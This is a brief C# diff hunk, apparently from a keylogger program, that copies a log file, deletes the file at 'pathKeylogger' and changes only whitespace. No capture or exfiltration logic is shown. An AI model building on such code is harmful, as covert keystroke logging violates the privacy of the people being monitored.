@@ -88,7 +88,7 @@ namespace Server
                 {
                     timeStop = DateTime.Now;
                     copyFile();
-                    File.Delete(pathKeylogger);
+                    File.Delete(pathKeylogger   );
                     prevProcessName = null;
                 }
                 catch (Exception)
